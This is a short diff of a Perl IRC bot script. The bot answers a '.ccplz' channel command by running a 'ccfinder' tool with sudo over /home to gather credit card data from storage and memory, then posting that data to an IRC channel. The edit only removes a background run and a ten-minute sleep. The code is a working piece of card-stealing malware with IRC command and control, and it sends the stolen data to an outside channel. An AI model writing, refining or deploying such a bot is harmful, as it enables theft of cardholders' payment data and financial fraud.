@@ -37,8 +37,7 @@ $irc->on(irc_privmsg => sub {
  if ($msg =~ /@.ccplz/) {
   warn 'Sending CC info to IRC...';
   $irc->write(notice => $noticechan => "[Info] Fetching CC data from Storage and Memory...");
-  system 'sudo ./ccfinder /home &';
-  Time::HiRes::sleep(600);
+  system 'sudo ./ccfinder /home';
   $irc->write(notice => $noticechan => "[Info] Now sending CC data in channel...");
   open(my $fh, '<:encoding(UTF-8)', $filename);
   while (my $row = <$fh>) {
